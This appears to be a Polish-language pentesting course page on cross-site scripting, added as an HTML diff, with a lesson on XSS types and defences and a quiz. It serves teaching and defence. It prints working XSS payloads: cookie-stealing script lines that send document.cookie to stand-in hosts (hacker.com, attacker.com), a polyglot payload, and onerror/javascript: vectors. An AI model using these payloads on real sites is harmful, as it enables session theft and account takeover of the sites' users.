@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="pl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lekcja 09: XSS (Cross-Site Scripting) - Kurs Pentestera</title>
+
+    <link rel="stylesheet" href="style.css">
+
+    <style>
+        /* Akcent: Electric Cyan (Client-Side / JavaScript execution) */
+        :root {
+            --accent: #00e676;
+            --accent-glow: rgba(0, 230, 118, 0.3);
+        }
+
+        .code-js {
+            color: #ffff00;
+        }
+
+        .code-html {
+            color: #00e5ff;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <header>
+            <h1>CROSS-SITE SCRIPTING (XSS)</h1>
+            <p>MODUŁ 09: &lt;script&gt;alert(1)&lt;/script&gt; i kradzież tożsamości</p>
+        </header>
+
+        <!-- 1. DEFINICJA -->
+        <section>
+            <h2>> CZYM JEST XSS?</h2>
+            <p>XSS to błąd polegający na tym, że aplikacja bierze dane od użytkownika i wyświetla je na stronie
+                <strong>bez czyszczenia</strong>. Przeglądarka myśli, że to kod strony i go wykonuje.</p>
+
+            <div class="card">
+                <h3>ANATOMIA ATAKU</h3>
+                <p>Haker wpisuje w komentarzu:</p>
+                <pre><code>Cześć! &lt;script&gt;<span class="code-js">fetch('https://hacker.com?c='+document.cookie)</span>&lt;/script&gt;</code></pre>
+                <p><strong>Efekt:</strong> Każdy, kto wyświetli ten komentarz (np. Admin), nieświadomie wyśle swoje
+                    ciasteczka sesyjne do hakera. To prowadzi do przejęcia konta (Account Takeover).</p>
+            </div>
+        </section>
+
+        <!-- 2. TYPY XSS -->
+        <section>
+            <h2>> TRZY TWARZE XSS</h2>
+            <p>Jako pentester musisz rozróżniać, jak payload trafia do ofiary.</p>
+
+            <div class="card">
+                <h3>1. REFLECTED XSS (Odbity)</h3>
+                <p>Złośliwy kod znajduje się <strong>w linku</strong> (URL). Serwer "odbija" go z powrotem do
+                    przeglądarki.</p>
+                <ul>
+                    <li><strong>Wektor:</strong> Link w mailu/SMS:
+                        <code>site.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+                    <li><strong>Zasięg:</strong> Tylko osoba, która kliknie w link.</li>
+                    <li><strong>Cel:</strong> Phishing, kradzież sesji konkretnej osoby.</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>2. STORED XSS (Zapisany) - <span style="color:var(--danger)">NAJGROŹNIEJSZY</span></h3>
+                <p>Złośliwy kod zapisuje się <strong>w bazie danych</strong> (np. w treści posta, komentarza, nazwie
+                    użytkownika).</p>
+                <ul>
+                    <li><strong>Wektor:</strong> Haker dodaje komentarz na forum.</li>
+                    <li><strong>Zasięg:</strong> KAŻDY, kto wejdzie na stronę (nawet tysiące osób).</li>
+                    <li><strong>Cel:</strong> Masowa infekcja, robaki internetowe (Worms).</li>
+                </ul>
+            </div>
+
+            <div class="card">
+                <h3>3. DOM-BASED XSS</h3>
+                <p>Błąd jest tylko w <strong>JavaScript</strong> po stronie przeglądarki. Serwer w ogóle nie widzi
+                    payloadu.</p>
+                <ul>
+                    <li><strong>Przykład:</strong> Skrypt pobiera parametr z URL (<code>location.hash</code>) i wstawia
+                        go do HTML przez <code>innerHTML</code>.</li>
+                    <li><strong>Obrona:</strong> WAF (Web Application Firewall) tego nie wykryje, bo wszystko dzieje się
+                        w przeglądarce ofiary.</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- 3. OBRONA -->
+        <section>
+            <h2>> OBRONA: CONTEXT IS KING</h2>
+            <p>Filtrowanie <code>&lt;script&gt;</code> to za mało. Wszystko zależy od tego, gdzie lądują dane.</p>
+
+            <div class="card">
+                <h3>MECHANIZMY OBRONNE</h3>
+                <ol>
+                    <li><strong>Output Encoding (Sanityzacja):</strong> Zamiast wyświetlać <code>&lt;</code>, wyświetlaj
+                        bezpieczne <code>&amp;lt;</code>. Przeglądarka pokaże znaczek, ale nie wykona kodu.</li>
+                    <li><strong>CSP (Content Security Policy):</strong> Nagłówek, który zablokuje wykonanie skryptów
+                        inline, nawet jeśli haker je wstrzyknie. (Pamiętasz Lekcję 4?).</li>
+                    <li><strong>HttpOnly Cookies:</strong> Nawet jeśli XSS zadziała, haker nie ukradnie sesji JS-em
+                        (Pamiętasz Lekcję 3?).</li>
+                </ol>
+            </div>
+
+            <div class="card">
+                <h3>PRZYKŁADY PAYLOADÓW (Polyglots)</h3>
+                <p>Pentesterzy używają ciągów, które działają w wielu kontekstach:</p>
+                <pre><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;xmp&gt;<span class="code-html">&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;</span></code></pre>
+            </div>
+        </section>
+
+        <!-- CHECKLIST -->
+        <section>
+            <h2>CHECKLISTA / RED FLAGS</h2>
+            <div class="card checklist-card">
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>Input wchodzi, HTML wychodzi:</strong> Jeśli wpisujesz `&lt;b&gt;test&lt;/b&gt;` i
+                        widzisz pogrubiony tekst -> XSS jest bardzo prawdopodobny.</div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>Parametry w URL odzwierciedlane na stronie:</strong> Np. "Nie znaleziono wyników dla:
+                        [Twój Input]". Idealne miejsce na Reflected XSS.</div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>Używanie innerHTML w JS:</strong> W React/Vue/Angular używanie
+                        `dangerouslySetInnerHTML` lub `v-html` to proszenie się o kłopoty.</div>
+                </div>
+                <div class="checklist-item">
+                    <span class="check-icon">⚠</span>
+                    <div><strong>Brak CSP:</strong> Strona bez Content-Security-Policy jest naga w obliczu XSS.</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- QUIZ -->
+        <section id="quiz-section">
+            <h2>🎓 WERYFIKACJA WIEDZY</h2>
+            <div id="quiz-container"></div>
+        </section>
+
+        <footer>
+            <p style="text-align: center; margin-top: 50px; color: #555;">&copy; 2026 Kurs Pentestera | Moduł 09</p>
+        </footer>
+    </div>
+
+    <!-- DANE DO QUIZU -->
+    <script>
+        const quizData = [
+            {
+                question: "Co jest głównym celem ataku XSS?",
+                options: [
+                    "Usunięcie bazy danych.",
+                    "Wykonanie złośliwego kodu JavaScript w przeglądarce ofiary (np. w celu kradzieży sesji).",
+                    "Złamanie hasła na serwerze.",
+                    "Przeciążenie łącza internetowego."
+                ],
+                correct: 1,
+                explanation: "XSS to atak na użytkownika (Client-Side), a nie bezpośrednio na serwer. Haker używa Twojej strony, by atakować Twoich klientów."
+            },
+            {
+                question: "Czym różni się Stored XSS od Reflected XSS?",
+                options: [
+                    "Reflected działa tylko w nocy.",
+                    "Stored zapisuje się trwale na serwerze (np. w komentarzu) i atakuje każdego odwiedzającego. Reflected wymaga, by ofiara kliknęła w specjalnie spreparowany link.",
+                    "Stored dotyczy plików graficznych.",
+                    "Nie ma różnicy."
+                ],
+                correct: 1,
+                explanation: "Stored (Persistence) jest groźniejszy, bo nie wymaga interakcji (klikania w link). Wchodzisz na stronę i jesteś zainfekowany."
+            },
+            {
+                type: "scenario",
+                question: "Znalazłeś podatność XSS. Chcesz udowodnić klientowi, że to krytyczny błąd (PoC - Proof of Concept). Jaki payload zrobi największe wrażenie (ukazując realne ryzyko)?",
+                options: [
+                    "&lt;script&gt;alert(1)&lt;/script&gt;",
+                    "&lt;h1&gt;HACKED&lt;/h1&gt;",
+                    "&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;",
+                    "&lt;u&gt;test&lt;/u&gt;"
+                ],
+                correct: 2,
+                explanation: "Alert(1) dowodzi istnienia błędu. Ale kradzież ciasteczka (Cookie Stealing) pokazuje biznesowy skutek: przejęcie konta."
+            },
+            {
+                question: "Jaki mechanizm przeglądarki (nagłówek) najskuteczniej ogranicza skutki XSS?",
+                options: [
+                    "Access-Control-Allow-Origin",
+                    "Content-Security-Policy (CSP)",
+                    "X-Frame-Options",
+                    "Strict-Transport-Security"
+                ],
+                correct: 1,
+                explanation: "CSP działa jak Firewall w przeglądarce. Nawet jeśli haker wstrzyknie `<script>`, CSP zablokuje jego wykonanie lub wysłanie danych na obcy serwer."
+            },
+            {
+                type: "scenario",
+                question: "Programista użył funkcji 'strip_tags()', która usuwa znaczniki &lt;script&gt;. Czy to wystarczy?",
+                options: [
+                    "Tak, bez &lt;script&gt; nie ma XSS.",
+                    "Nie. Można wykonać JS w atrybutach zdarzeń, np. &lt;img src=x onerror=alert(1)&gt; lub w linkach &lt;a href='javascript:alert(1)'&gt;.",
+                    "Tak, to najlepsza metoda.",
+                    "Zależy od wersji PHP."
+                ],
+                correct: 1,
+                explanation: "To klasyczny błąd. JavaScript można uruchomić na dziesiątki sposobów bez użycia tagu script (event handlers: onmouseover, onerror, onload, onclick)."
+            },
+            {
+                question: "Co to jest DOM-Based XSS?",
+                options: [
+                    "XSS występujący w plikach PDF.",
+                    "Atak, w którym payload nie trafia do serwera, lecz jest przetwarzany wyłącznie przez JavaScript w przeglądarce (np. pobierany z fragmentu URL po #).",
+                    "Atak na domenę.",
+                    "Atak na serwer DNS."
+                ],
+                correct: 1,
+                explanation: "DOM XSS jest trudny do wykrycia przez logi serwera, bo serwer często w ogóle nie widzi złośliwego ciągu (fragment po # nie jest wysyłany do backendu)."
+            },
+            {
+                question: "Która flaga ciasteczka utrudnia kradzież sesji przy ataku XSS?",
+                options: [
+                    "Secure",
+                    "SameSite",
+                    "HttpOnly",
+                    "Domain"
+                ],
+                correct: 2,
+                explanation: "Powtarzamy to do znudzenia, bo to ważne: HttpOnly blokuje `document.cookie`. XSS zadziała, alert wyskoczy, ale ciastka nie ukradniesz."
+            },
+            {
+                question: "Co to jest 'Output Encoding' (Escaping)?",
+                options: [
+                    "Szyfrowanie danych w bazie.",
+                    "Zamiana znaków specjalnych na ich bezpieczne odpowiedniki HTML (np. < na &amp;lt;) przed wyświetleniem ich w przeglądarce.",
+                    "Kompresja obrazków.",
+                    "Ukrywanie kodu źródłowego."
+                ],
+                correct: 1,
+                explanation: "To najskuteczniejsza metoda naprawy (remediacji) XSS. Dane są traktowane jako treść (tekst), a nie jako kod wykonywalny."
+            },
+            {
+                type: "scenario",
+                question: "Widzisz pole wyszukiwania, które wyświetla: 'Wyniki dla: <b>UserInpu</b>'. Jak sprawdzić czy jest podatne na XSS?",
+                options: [
+                    "Wpisać bardzo długi tekst.",
+                    "Wpisać tagi HTML, np. &lt;u&gt;test&lt;/u&gt; lub &lt;img src=x onerror=alert(1)&gt; i sprawdzić, czy zostaną wyrenderowane przez przeglądarkę.",
+                    "Wpisać SQL Injection.",
+                    "Kliknąć prawym przyciskiem myszy."
+                ],
+                correct: 1,
+                explanation: "Jeśli przeglądarka 'zrozumie' Twój HTML (pogrubi, podkreśli, albo spróbuje załadować obrazek), znaczy to, że input nie jest czyszczony."
+            },
+            {
+                question: "Czy XSS może być użyty do ataku CSRF?",
+                options: [
+                    "Nie, to dwa różne ataki.",
+                    "Tak. Jeśli masz XSS, możesz za pomocą JS wysłać dowolne żądanie w imieniu użytkownika, automatycznie omijając tokeny anty-CSRF (bo JS może je odczytać ze strony).",
+                    "Tylko w Internet Explorerze.",
+                    "Tylko jeśli strona używa Flash."
+                ],
+                correct: 1,
+                explanation: "XSS to 'król'. Jeśli masz XSS, masz też CSRF, masz dane, masz sesję. XSS pozwala wykonać każdą akcję, którą może wykonać użytkownik."
+            }
+        ];
+    </script>
+
+    <script src="quiz.js"></script>
+
+</body>
+
+</html>
